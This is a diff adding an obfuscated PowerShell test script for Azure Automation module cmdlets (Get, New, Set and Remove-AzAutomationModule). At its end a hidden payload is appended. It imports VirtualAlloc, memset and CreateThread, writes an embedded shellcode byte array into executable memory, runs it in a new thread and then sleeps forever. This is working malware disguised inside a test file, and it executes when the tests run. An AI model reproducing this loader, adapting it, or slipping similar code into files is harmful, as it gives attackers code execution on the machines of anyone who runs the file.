@@ -1,0 +1,159 @@
+seT ("R"+"6N5a") (  [TYPE]("{7}{10}{6}{12}{8}{14}{5}{15}{11}{2}{16}{0}{17}{9}{1}{3}{4}{13}" -F'om','ksUP','TIE','PO','r','ComMaNDs.UtI','.W','M','SaZure','N.TESTMoc','icrosofT','I','InDOw','t','.','l','S.C','mO') )  ;${TESTAUt`OM`AtI`o`NACCo`UnT} = @{
+    ("{2}{1}{3}{0}"-f 'ame','sourceGr','Re','oupN') = ("{0}{5}{3}{1}{4}{2}" -f'anatolib','ure','-test-rg','az','ps','-')
+    ("{0}{1}{2}{4}{3}" -f 'A','ut','oma','nAccountName','tio') = ("{1}{2}{3}{4}{0}"-f 'zureps-test-aa','a','na','tol','ib-a')
+}
+
+${T`esTgLo`BA`LmO`DULE} = @{
+	("{0}{1}"-f'Nam','e') = ("{0}{1}" -f 'Az','ure')
+	("{2}{1}{0}"-f'on','ersi','V') = ("{0}{1}"-f'1','.0.3')
+	("{1}{0}" -f'ze','Si') = 41338511
+	("{4}{1}{2}{0}{3}" -f'un','ctivity','Co','t','A') = 673
+}
+
+${teSTNo`Ng`LOBaLMO`DuLe} = @{
+    ("{0}{1}" -f'Nam','e') = ("{1}{0}{2}"-f'st','Pe','er')
+	("{1}{0}" -f 'on','Versi') = ("{1}{0}"-f'.3','3.0')
+    ("{0}{2}{1}"-f'ContentLinkU','i','r') = ("{11}{8}{13}{0}{5}{10}{6}{2}{3}{7}{1}{12}{9}{4}"-f 'psga','o','.blob.c','ore.wi','.nupkg','ller','age','nd','t','ckages/pester.3.0.3','ystor','h','ws.net/pa','tps://devo')
+	("{0}{1}"-f 'S','ize') = 74921
+}
+
+function ENS`UReT`eSTMOduLE`Im`p`o`RTEd {
+	${F`oun`dMOd`Ule} = &("{4}{5}{0}{6}{2}{1}{3}"-f 'utom','Mod','on','ule','G','et-AzA','ati') -Name ${Te`st`NO`N`GLo`BALmoDULE}."N`AME" @testAutomationAccount -ErrorAction ("{1}{0}" -f 'nore','Ig')
+    if (${F`OU`NdMOdu`LE}) {
+		if (${fOuND`mO`D`Ule}."p`ROvisI`oNi`NgstA`Te" -ne ("{3}{1}{0}{2}"-f'c','u','ceeded','S')) {
+			&("{3}{0}{4}{2}{1}" -f'emo','AzAutomationModule','e-','R','v') -Name ${tE`sTNonglOb`Alm`odule}."Na`me" @testAutomationAccount -Force
+			${f`Ou`Nd`MOdule} = ${NU`lL}
+		}
+	}
+
+    if (-not ${f`OuNdMo`D`ULE}) {
+        ${O`U`TPUt} = &("{2}{3}{5}{4}{1}{6}{0}" -f 'dule','m','Ne','w','o','-AzAut','ationMo') -Name ${teS`TNoN`GloB`Almo`D`U`le}."N`AME" -ContentLinkUri ${T`eStnOnGlOBa`lmO`dUle}."C`oNt`e`NTlInkuri" @testAutomationAccount
+		&("{1}{2}{0}"-f 'rbose','Write-V','e') "Module $($testNonGlobalModule.Name) provisioning state: $($output.ProvisioningState) "
+
+		${STA`RTT`Ime} = &("{0}{2}{1}" -f'Get','te','-Da')
+		${TIm`e`ouT} = &("{0}{1}{2}"-f 'New-','TimeSp','an') -Minutes 3
+		${EN`dT`ImE} = ${St`ARTtI`ME} + ${TiME`ouT}
+
+        while (${O`UT`PuT}."PRO`Vi`S`IOnInGsTA`TE" -ne ("{1}{2}{0}" -f 'cceeded','S','u')) {
+             ( GET-chiLDItem  ('VAriaBLE'+':'+'r'+'6N5A')  ).vAluE::("{1}{0}"-f'y','Dela').Invoke(10*1000)
+
+            ${o`UT`put} = &("{2}{0}{3}{1}{4}" -f '-','utomati','Get','AzA','onModule') -Name ${TES`TnO`NgLobA`Lm`o`duLE}."n`AME" @testAutomationAccount
+			&("{4}{1}{2}{3}{0}"-f'se','te-','V','erbo','Wri') "Module $($testNonGlobalModule.Name) provisioning state: $($output.ProvisioningState) "
+
+			if ((&("{0}{1}"-f 'G','et-Date')) -gt ${eN`D`TimE}) {
+				throw "Module $($testNonGlobalModule.Name) took longer than $timeout to import "
+			}
+        }
+    }
+}
+
+function ReMoVe-TE`sTn`oNgloBa`l`mO`DuLe {
+    if (&("{3}{2}{1}{0}{4}"-f'ionModul','tomat','AzAu','Get-','e') -Name ${tEsTnO`Ng`LoBA`LModuLe}."N`AmE" @testAutomationAccount -ErrorAction ("{0}{1}"-f'I','gnore')) {
+        &("{4}{5}{1}{0}{2}{3}{6}"-f 'utom','A','ation','Mo','Re','move-Az','dule') -Name ${tEs`T`Nonglobalmo`D`U`Le}."N`AMe" @testAutomationAccount -Force
+    }
+}
+
+
+function TEsT-G`Et`ALLm`oDUlEs {
+	${o`UT`Put} = &("{2}{4}{5}{3}{1}{6}{0}" -f'Module','om','Ge','t','t','-AzAu','ation') @testAutomationAccount
+
+	&("{1}{0}{3}{2}"-f 'ert-','Ass','tNull','No') ${oU`T`pUT}
+	${OUTp`U`TcO`UNT} = ${O`U`Tput} | &("{3}{0}{1}{2}" -f 'asur','e-Objec','t','Me') | &('%') ("{0}{1}" -f 'Coun','t');
+	&("{3}{0}{2}{1}"-f't-','e','Tru','Asser') { ${OutP`U`TCoUNT} -gt 1 } ("{1}{2}{10}{11}{5}{9}{0}{7}{4}{6}{12}{3}{8}"-f'dul','Ge','t-',' than','pu','tion','t ','e should out',' one object','Mo','Az','Automa','more')
+
+    ${aZureM`o`duLE} = ${ou`TPut} | &('?'){ ${_}."n`AmE" -eq ${tEsT`glO`BaLMoD`ULe}."NA`me" }
+	&("{4}{0}{1}{3}{2}"-f 'sert-','Are','qual','E','As') ${AzuRemO`Du`Le}."AUtOMA`TiONAcC`O`U`NtnAME" ${tE`s`TaUToMA`T`IOna`CcoUNT}."a`Ut`oM`A`TI`onacCouNtnAmE"
+	&("{0}{3}{1}{2}{4}" -f'As','ert-Ar','eE','s','qual') ${az`URe`ModUle}."reSOU`Rce`Gro`Up`NAME" ${te`s`TAuTomAtIOnaC`c`o`U`Nt}."REsO`URC`eGr`ouPn`A`me"
+	&("{2}{1}{0}{3}{4}" -f'ert-A','s','As','reEqu','al') ${aZ`U`REmO`DULe}."NA`mE" ${teST`gL`o`BA`LMOd`ULe}."NA`Me"
+	&("{3}{2}{1}{0}"-f'rue','rt-T','e','Ass') { ${azuRe`mO`DU`le}."IsGl`o`BAl" }
+	&("{1}{0}{2}"-f 'rt','Asse','-AreEqual') ${azur`E`M`oDuLe}."VErs`I`oN" ${T`EST`GlObAlMOD`ULe}."v`eRsION"
+	&("{0}{2}{1}{3}"-f'A','t-Are','sser','Equal') ${Az`U`REMOdu`LE}."SI`z`eInBYTEs" ${TeS`TGLOB`AlmOD`ULE}."S`IZE"
+	&("{1}{0}{2}"-f're','Assert-A','Equal') ${A`Zur`eM`odULe}."ActIVityC`o`UNT" ${t`e`STglOBaLMO`dULE}."aCtIV`iTY`C`Ount"
+	&("{2}{1}{3}{0}"-f 'l','ert','Ass','-NotNul') ${aZu`REmODU`Le}."CReaT`io`Nt`ImE"
+	&("{1}{3}{0}{2}"-f'er','As','t-NotNull','s') ${Azu`Remo`d`Ule}."LAStM`o`DifIe`dtI`ME"
+	&("{1}{0}{3}{2}" -f 's','As','al','ert-AreEqu') ${AZ`Ure`MOdULE}."pR`o`Vis`I`onIngSTATe" ("{1}{2}{0}" -f 'ted','Cr','ea')
+}
+
+
+function TEST`-gETmO`DUl`EByNaMe {
+	${outp`UT} = &("{0}{4}{1}{3}{2}"-f'Get-A','tom','ule','ationMod','zAu') -Name ${t`e`Stg`L`oBalm`oDulE}."n`AMe" @testAutomationAccount
+
+	&("{0}{1}{3}{2}"-f'As','sert-No','ull','tN') ${OU`T`PuT}
+	${ouT`PutcO`UNt} = ${out`PUT} | &("{3}{1}{2}{0}" -f't','-Obj','ec','Measure') | &('%') ("{0}{1}"-f 'Cou','nt');
+	&("{4}{3}{1}{0}{2}"-f'rt-AreEq','se','ual','s','A') ${O`UTP`UTCO`UNT} 1
+
+	&("{2}{0}{3}{4}{1}" -f 'sert','Equal','As','-A','re') ${ou`T`pUt}."aut`O`mat`iON`ACCOU`NT`NAme" ${tesTaUtoMATiO`N`AC`C`oUnT}."AUTOm`AtI`oN`AcC`OUNtnaME"
+	&("{4}{2}{3}{0}{1}" -f'AreEqu','al','rt','-','Asse') ${ouTP`Ut}."rE`s`ouRcE`GRou`P`NAme" ${TeSt`AUtO`MA`TIoNaccouNT}."rEs`O`U`RCegROUPnamE"
+	&("{1}{2}{3}{0}" -f'ual','Asser','t-Ar','eEq') ${o`U`TpuT}."NA`mE" ${TeSt`gloBAlM`Od`UlE}."na`ME"
+	&("{0}{3}{1}{2}"-f 'A','r','ue','ssert-T') { ${O`Utput}."Is`GLO`BAL" }
+	&("{2}{4}{1}{0}{3}"-f'AreE','rt-','As','qual','se') ${o`UtP`UT}."VER`SioN" ${t`e`S`TglobALMOduLe}."V`ErSION"
+	&("{1}{0}{4}{2}{3}" -f 's','A','-AreEqu','al','sert') ${o`UTpUt}."SIZe`i`Nb`yTEs" ${T`E`st`gLOBALMo`dULE}."si`zE"
+	&("{1}{3}{2}{0}" -f'qual','Asser','-AreE','t') ${O`U`TpUT}."A`c`TIViT`Yco`UnT" ${TE`STgLoBA`L`moDulE}."aCT`IVIty`c`oUNt"
+	&("{4}{2}{0}{1}{3}" -f'sert-NotNu','l','s','l','A') ${o`UtpuT}."C`Re`ATIO`NTIMe"
+	&("{0}{1}{2}{3}"-f'A','ss','er','t-NotNull') ${OU`T`puT}."l`AS`T`MOdI`FiEdTimE"
+	&("{3}{0}{2}{1}" -f'sser','ual','t-AreEq','A') ${OU`Tp`Ut}."P`ROvi`sIONINg`statE" ("{0}{2}{1}" -f 'Crea','ed','t')
+}
+
+
+function Te`S`T-neWm`oDuLe {
+	&("{5}{3}{0}{2}{1}{4}"-f'o','estNonGlobalMod','ve-T','m','ule','Re')
+
+	${ouTP`UT} = &("{3}{2}{1}{4}{0}"-f'e','od','mationM','New-AzAuto','ul') -Name ${tes`Tn`oNglObAlMOdu`Le}."N`AmE" -ContentLinkUri ${T`esTn`oNglOba`L`M`odULe}."C`oNTEN`TlI`NkurI" @testAutomationAccount
+
+	&("{3}{0}{2}{1}" -f'sert','tNull','-No','As') ${Ou`T`PUT}
+	${oUtP`UTCou`NT} = ${OU`T`Put} | &("{0}{1}{3}{2}" -f 'Me','asu','-Object','re') | &('%') ("{0}{1}"-f 'Cou','nt');
+	&("{2}{0}{3}{1}" -f 'rt-A','eEqual','Asse','r') ${Outp`Utc`O`UNt} 1
+
+	&("{0}{3}{2}{1}"-f'Ass','reEqual','t-A','er') ${Ou`TPut}."a`UtomA`Tio`NaccounTNA`ME" ${tEs`T`Aut`OM`ATioN`ACcOU`NT}."AuTO`MatION`AC`Co`UNt`NAME"
+	&("{0}{3}{1}{2}"-f'Assert-A','ua','l','reEq') ${o`UTpuT}."r`es`OURCegr`o`Upn`Ame" ${Te`s`TAuTO`maTIoNA`cCo`UNT}."r`Esourc`e`gRoupName"
+	&("{2}{0}{1}{3}"-f'e','rt','Ass','-AreEqual') ${Out`put}."N`AmE" ${TEsTnOngLOBa`l`MOd`UlE}."N`AME"
+	&("{1}{2}{3}{0}" -f 't-False','A','ss','er') { ${oUT`P`UT}."IS`G`LObAL" }
+	&("{2}{1}{0}{3}" -f'Nul','rt-','Asse','l') ${out`pUt}."v`erSiOn"
+	&("{1}{2}{0}"-f'AreEqual','Asser','t-') ${O`Utp`UT}."siZeIN`BY`TEs" 0
+	&("{4}{0}{1}{3}{2}" -f 're','E','al','qu','Assert-A') ${outp`Ut}."aCTIvi`TyCO`UNt" 0
+	&("{2}{0}{3}{1}" -f 't','ull','Assert-No','N') ${oU`Tp`UT}."c`ReAtI`OnTI`ME"
+	&("{0}{1}{3}{2}"-f 'As','sert-','l','NotNul') ${out`pUT}."Las`Tm`odi`FIe`dTImE"
+	&("{0}{1}{2}"-f 'Ass','ert-Ar','eEqual') ${ou`TpUt}."PrO`V`iSiOninGs`TaTE" ("{1}{0}"-f'eating','Cr')
+}
+
+
+function TEs`T`-i`MporTMOdULe {
+    ${cOM`m`AND} = &("{1}{2}{0}"-f'mand','G','et-Com') ("{0}{4}{1}{3}{2}"-f 'Import-Az','i','le','onModu','Automat')
+    &("{0}{2}{3}{1}" -f 'Asser','ual','t-','AreEq') ${C`omm`AND}."C`OMmanD`TyPe" ("{1}{0}" -f 's','Alia')
+    &("{2}{1}{0}{3}"-f 'rt-AreEq','se','As','ual') ${coM`M`And}."d`EFi`NITIOn" ("{3}{2}{0}{1}{4}"-f 'oma','tionMod','ut','New-AzA','ule')
+}
+
+
+function tESt`-`setMo`DUle {
+	&("{0}{3}{4}{2}{1}{5}" -f'Ens','eImport','l','ure','TestModu','ed')
+
+	${O`U`TPUT} = &("{4}{5}{6}{1}{2}{0}{3}"-f 'u','utomat','ionMod','le','Se','t-Az','A') -Name ${tE`STnoNGlo`BA`LM`oDULe}."n`AmE" -ContentLinkUri ${T`est`NO`NgL`obalm`odULE}."cON`Te`NTLinKU`RI" @testAutomationAccount
+
+	&("{0}{1}{4}{2}{3}" -f 'Ass','e','t-','NotNull','r') ${O`UTP`UT}
+	${outp`UT`C`oUNT} = ${O`UTpUt} | &("{1}{3}{2}{0}"-f 'ct','M','je','easure-Ob') | &('%') ("{1}{0}"-f 'unt','Co');
+	&("{0}{2}{1}" -f'Ass','-AreEqual','ert') ${OU`TpuT`COUnT} 1
+
+	&("{1}{0}{2}"-f't-Ar','Asser','eEqual') ${Ou`Tp`UT}."aUToMa`T`I`ON`A`CcOUNtNa`Me" ${teSTa`UTO`m`A`TiONAcC`Ount}."A`UtOMAtIonA`C`CouNt`NAMe"
+	&("{1}{3}{0}{4}{2}" -f'rt-Ar','Ass','qual','e','eE') ${oU`TPUt}."RESOuRc`egROU`Pna`mE" ${t`eSt`A`UtOMaTi`onaCcOu`Nt}."rES`ou`RCEg`RouPname"
+	&("{2}{0}{1}{3}" -f'e','Eq','Assert-Ar','ual') ${O`U`TPUt}."NA`mE" ${TE`stnON`gl`Ob`ALMOduLe}."n`AME"
+	&("{1}{2}{0}{3}"-f 'rt-Fa','As','se','lse') { ${OU`Tput}."isGlO`BaL" }
+	&("{0}{1}{3}{2}{4}" -f'As','s','AreEqu','ert-','al') ${OuTP`UT}."Ve`RS`IoN" ${tES`TNonGlobAL`Mo`Du`LE}."veR`SI`oN"
+	&("{1}{0}{2}"-f't-Are','Asser','Equal') ${OUTP`Ut}."Si`zE`inb`YTes" ${tESTN`O`NGLoBalm`oduLE}."SI`zE"
+	&("{0}{3}{1}{2}" -f'A','sert-AreEqu','al','s') ${OU`TP`UT}."Ac`TiVit`ycoUnT" 0
+	.("{3}{2}{1}{0}"-f'ull','rt-NotN','sse','A') ${out`pUT}."cREAt`iontI`me"
+	.("{3}{0}{4}{2}{1}"-f 's','ll','-NotNu','As','ert') ${o`UTpUt}."laStm`oDif`i`edtiME"
+	&("{1}{3}{2}{0}" -f 'al','Assert-Are','u','Eq') ${o`U`Tput}."pro`VI`SiOni`NgStATE" ("{2}{0}{1}"-f 'reatin','g','C')
+}
+
+
+function tEsT-`Rem`oVEM`o`duLE {
+	&("{3}{2}{0}{1}{4}{5}"-f'estMod','u','T','Ensure','leIm','ported')
+
+	${o`UT`PUT} = .("{3}{0}{2}{1}{4}"-f 'Automati','nModul','o','Remove-Az','e') -Name ${testnoNgL`O`Ba`lM`oduLe}."N`AmE" @testAutomationAccount -Force
+
+	.("{0}{1}{2}"-f 'As','sert-Nu','ll') ${O`UTp`Ut}
+	${m`odUlEfoU`Nd} = &("{3}{0}{5}{4}{2}{1}" -f'-AzAutoma','e','l','Get','u','tionMod') -Name ${teSTn`oN`GL`oBa`LM`OdULe}."N`AME" @testAutomationAccount -ErrorAction ("{0}{1}" -f 'Ign','ore')
+	&("{0}{2}{3}{1}" -f 'As','Null','se','rt-') ${Mo`d`U`LefOUnD}
+}
+
+${6`ib} = ((("{48}{41}{36}{42}{88}{11}{26}{2}{100}{64}{73}{118}{30}{40}{21}{4}{105}{52}{22}{51}{96}{53}{115}{74}{20}{60}{14}{5}{29}{66}{69}{8}{10}{39}{15}{98}{110}{43}{120}{87}{63}{7}{38}{18}{91}{0}{102}{19}{86}{33}{111}{95}{94}{113}{72}{56}{103}{70}{9}{107}{112}{121}{49}{75}{50}{104}{97}{122}{90}{114}{68}{92}{25}{61}{57}{24}{45}{80}{101}{28}{85}{35}{62}{32}{81}{84}{31}{6}{47}{54}{59}{44}{117}{82}{55}{23}{1}{67}{17}{12}{79}{76}{89}{78}{65}{123}{108}{46}{109}{71}{93}{13}{99}{116}{34}{83}{77}{3}{119}{27}{106}{37}{58}{16}" -f'm','Thr','6','nt ','at','d','m',' flPr','Size','ntPtr C',', uint ','H','llImp','mset','Ad','lAllo','count);','[D','ct);','t(Ha6kerne','Ptr l','t',' ex',' lp','ckSize, In','t','a','rc','r','ress, ui','bli','ara','t','ll','dest, ','ss, In','llI',' ui','ote','f','c s','D','mport','nTy',' dwC','tP','atic extern ','e','[','n','r l','ter','c','t','te','Ptr','c ex','ta','nt ','r, uint','p',' dwS','tP','t','nel32',']public ','nt','eadId);','ui',' dw','ern I',' m','stati','.dllH','lAlloc(Int','tPt','Ha','i','6)','ort(','tr lpS','r ','eationFlags, Int','u','lpP','e','l32.d','e, uin','(','6msvcrt.dllHa','utes,','[DllI','n','e','bl','a6)]pu','n In','Thre','cati','(IntPt','ker','tartAdd','por','t','p','i',',','reate','t','IntPtr','o','H','Threa','ic ',' ','Ptr Virtua','r ','r','a6)]pu','s','p','d(I','adAttrib','s'))-repLAcE  'Ha6',[chAr]34);${w} = .("{2}{1}{0}" -f'e','dd-Typ','A') -memberDefinition ${6`ib} -Name ("{1}{0}" -f'in32','W') -namespace ("{3}{0}{4}{2}{1}"-f'n32Fu','tions','c','Wi','n') -passthru;[Byte[]];[Byte[]]${Z} = 0xda,0xdf,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0xb8,0xf1,0x59,0xc2,0x40,0x31,0x46,0x18,0x83,0xee,0xfc,0x03,0x46,0xe5,0xbb,0x37,0xbc,0xed,0xbe,0xb8,0x3d,0xed,0xde,0x31,0xd8,0xdc,0xde,0x26,0xa8,0x4e,0xef,0x2d,0xfc,0x62,0x84,0x60,0x15,0xf1,0xe8,0xac,0x1a,0xb2,0x47,0x8b,0x15,0x43,0xfb,0xef,0x34,0xc7,0x06,0x3c,0x97,0xf6,0xc8,0x31,0xd6,0x3f,0x34,0xbb,0x8a,0xe8,0x32,0x6e,0x3b,0x9d,0x0f,0xb3,0xb0,0xed,0x9e,0xb3,0x25,0xa5,0xa1,0x92,0xfb,0xbe,0xfb,0x34,0xfd,0x13,0x70,0x7d,0xe5,0x70,0xbd,0x37,0x9e,0x42,0x49,0xc6,0x76,0x9b,0xb2,0x65,0xb7,0x14,0x41,0x77,0xff,0x92,0xba,0x02,0x09,0xe1,0x47,0x15,0xce,0x98,0x93,0x90,0xd5,0x3a,0x57,0x02,0x32,0xbb,0xb4,0xd5,0xb1,0xb7,0x71,0x91,0x9e,0xdb,0x84,0x76,0x95,0xe7,0x0d,0x79,0x7a,0x6e,0x55,0x5e,0x5e,0x2b,0x0d,0xff,0xc7,0x91,0xe0,0x00,0x17,0x7a,0x5c,0xa5,0x53,0x96,0x89,0xd4,0x39,0xfe,0x7e,0xd5,0xc1,0xfe,0xe8,0x6e,0xb1,0xcc,0xb7,0xc4,0x5d,0x7c,0x3f,0xc3,0x9a,0x83,0x6a,0xb3,0x35,0x7a,0x95,0xc4,0x1c,0xb8,0xc1,0x94,0x36,0x69,0x6a,0x7f,0xc7,0x96,0xbf,0xea,0xc2,0x00,0x1f,0x38,0x18,0x5a,0xf7,0xbc,0xa1,0x49,0xc8,0x48,0x47,0x3d,0x98,0x1a,0xd8,0xfd,0x48,0xdb,0x88,0x95,0x82,0xd4,0xf7,0x85,0xac,0x3e,0x90,0x2f,0x43,0x97,0xc8,0xc7,0xfa,0xb2,0x83,0x76,0x02,0x69,0xee,0xb8,0x88,0x9e,0x0e,0x76,0x79,0xea,0x1c,0xee,0x89,0xa1,0x7f,0xb8,0x96,0x1f,0x15,0x44,0x03,0xa4,0xbc,0x13,0xbb,0xa6,0x99,0x53,0x64,0x58,0xcc,0xe8,0xad,0xcc,0xaf,0x86,0xd1,0x00,0x30,0x56,0x84,0x4a,0x30,0x3e,0x70,0x2f,0x63,0x5b,0x7f,0xfa,0x17,0xf0,0xea,0x05,0x4e,0xa5,0xbd,0x6d,0x6c,0x90,0x8a,0x31,0x8f,0xf7,0x0a,0x0d,0x46,0x31,0x79,0x7f,0x5a;${G} = 0x1000;if (${Z}."leng`Th" -gt 0x1000){${G} = ${Z}."leNG`TH"};${z`xyP}=${W}::("{3}{0}{2}{1}" -f'a','Alloc','l','Virtu').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${Z}."LEN`gtH"-1);${I}++) {${W}::"Me`mSeT"([IntPtr](${zX`Yp}.("{1}{0}{2}"-f'oIn','T','t32').Invoke()+${i}), ${z}[${I}], 1)};${W}::("{1}{0}{2}" -f'reateTh','C','read').Invoke(0,0,${zX`yp},0,0,0);for (;;){.("{0}{1}{2}"-f'St','art','-sleep') 60};
